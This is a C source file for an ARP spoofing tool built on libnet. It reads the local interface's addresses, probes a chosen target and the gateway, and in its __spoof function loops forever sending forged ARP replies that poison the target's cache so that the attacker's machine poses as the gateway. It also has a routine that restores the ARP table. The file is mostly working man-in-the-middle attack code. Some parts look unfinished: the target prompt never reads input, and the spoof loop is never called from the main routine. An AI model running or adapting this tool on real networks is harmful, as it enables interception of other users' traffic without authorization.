#include "arpspoof.h"

short __init_arpspoof__( char *iface, struct net *_net )
{   
    struct libnet_ether_addr *hw;
    if ( !(lt = libnet_init( LIBNET_LINK, iface, arpspoof_errbuf )) ) {
        return -1;
    }

    // hardware address of device
    if ( !(hw = libnet_get_hwaddr( lt )) ) {
        sprintf( arpspoof_errbuf, "%s", libnet_geterror( lt ) );
        return -1;
    }
    
    sprintf( 
        _net->hw, "%02x:%02x:%02x:%02x:%02x:%02x",
            hw->ether_addr_octet[0],
            hw->ether_addr_octet[1],
            hw->ether_addr_octet[2],
            hw->ether_addr_octet[3],
            hw->ether_addr_octet[4],
            hw->ether_addr_octet[5]
    );

    if ( dev_addr( iface, _net->ip, IPV4, arpspoof_errbuf ) < 0 ) {
        return -1;
    }
    if ( dev_addr( iface, _net->nmask, MASK, arpspoof_errbuf ) < 0 ) {
        return -1;
    }
    
    _net->iface       = iface;
    _net->hosts_range = calc_hosts( _net->ip, _net->nmask );
    _net->start_ip    = net_off(    _net->ip, _net->nmask );
    _net->subnet      = calc_subnet( _net->nmask );
    return 0;
}

short arp_receiver_start( struct net *_net )
{
    int err;
    pthread_t thread;
    
    err = pthread_create(
        &thread,
        NULL,
        arp_receiver,
        (void *) _net
    );

    if ( err ) {
        sprintf( 
            arpspoof_errbuf, 
            "Error spawning arp_receiver() thread!\n" 
        );
        return -1;
    }
    printf( "%s[+]%s Arp receiver spawned successfully!\n", GRN, NLL );
    mssleep( 0.5 );
    return 0;
}

void list_targets( struct endpoint *_entps )
{
    for ( register uint32_t i = 0 ; i < live_hosts ; i++ ){
        printf( "%s[-]%s %s\n", GRN, NLL, (_entps++)->host_ip );
    }
    printf( "\n" );
}

short endpoint_hw( char *ip, uint8_t *hw, struct endpoint *_entps )
{
    if ( live_hosts <= 0 ) {
        return -1;
    }
    for ( register uint32_t i = 0 ; i < live_hosts ; i++ ) {
        if ( strcmp( ip, _entps->host_ip ) == 0 ) {
            cnvrt_hw2b( _entps->host_hw, hw );
            return 0;
        }
        _entps++;
    }
    return -1;
}

void arp_clear_arp( struct spf_endpoints *_spf )
{
    uint8_t src_ip[4];
    uint8_t dst_ip[4];

    cnvrt_ip2b( _spf->gateway, src_ip );
    cnvrt_ip2b( _spf->target,  dst_ip );

    printf( "Restoring arp table...\n" );
    for ( char i = 0 ; i < 5 ; i++ ) {
        arp_inject(
            lt, ARPOP_REPLY, _spf->gateway_hw, src_ip, _spf->target_hw, dst_ip
        );
        sleep( 1 );
    }
    printf( "\n" );
}

void __spoof( struct spf_endpoints *_spf, struct net *_net )
{
    uint8_t src_hw[6];
    uint8_t src_ip[4];
    uint8_t dst_ip[4];

    cnvrt_hw2b( _net->hw,      src_hw );
    cnvrt_ip2b( _spf->gateway, src_ip );
    cnvrt_ip2b( _spf->target,  dst_ip );

    for ( ;; ) {
        arp_inject(
            lt, ARPOP_REPLY, src_hw, src_ip, _spf->target_hw, dst_ip
        );
        sleep( 2 );
    }
}

void gather_endpoints( struct spf_endpoints *_spf, short target )
{
    if ( !target ) {
        printf( "[*] Choose a target: " );
    }

    printf( "%s\n", _spf->target );
    printf( "%s\n", _spf->gateway );
}

void arpspoof( struct net *_net, struct spf_endpoints *_spf )
{
    short t;
    struct endpoint _endps[_net->hosts_range];
    
    t = strcmp( _spf->target, "0" );
    switch ( t ) {
        case 0:
            printf( "%s[!]%s Target not specified!\n", RED, NLL );
            printf( "%s[+]%s Refreshing arp table...\n", GRN, NLL );
            arp_refresh( _net );
            break;
        
        default:
            if ( arp_receiver_start( _net ) < 0 ){
                __die( arpspoof_errbuf );
            }
            printf( "%s[+]%s Probing target...\n", GRN, NLL );
            probe_endpoint( _spf->target, _net );

            printf( "%s[+]%s Probing gateway...\n", GRN, NLL );
            probe_endpoint( _spf->gateway, _net );
            break;
    }

    if ( lookup_arp( _net->iface, _endps ) < 0 )
        __die( arpspoof_errbuf );

    gather_endpoints( _spf, t );
}